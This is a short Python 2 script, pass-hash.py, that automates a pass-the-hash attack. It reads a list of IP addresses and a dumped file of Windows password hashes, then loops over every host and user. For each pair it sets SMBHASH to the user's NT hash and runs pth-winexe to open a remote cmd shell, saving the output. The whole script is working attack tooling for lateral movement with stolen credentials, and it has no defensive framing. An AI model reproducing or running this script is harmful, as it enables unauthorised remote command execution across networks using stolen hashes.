#!/usr/bin/python

import subprocess,sys

if len(sys.argv) != 3:
    print "Usage: pass-hash.py <ips-file> <hash-file>"
    sys.exit(0)

with open(sys.argv[1]) as f:
    ips = f.readlines()
ips = [x.strip() for x in ips] 

hashTest = {}
with open(sys.argv[2]) as f:
    hashes = f.readlines()
    for x in hashes:
        appo = x.split(":")
        hashTest[appo[0]] = appo[3]



for ip in ips:
    print "IP: ", ip
    for k, value in hashTest.items():
        try: #pass the Hash
            print "user:",k
            bashCommand = "export SMBHASH=aad3b435b51404eeaad3b435b51404ee:" + value
            bashCommand = bashCommand + " && " + "pth-winexe -U "+ k +"% //"+ ip +" cmd > result/"+ip+"-"+k+"_pth-winexe &"
            output = subprocess.check_output(['bash','-c', bashCommand])
        except subprocess.CalledProcessError:
            print "subprocess error", ip, k
    
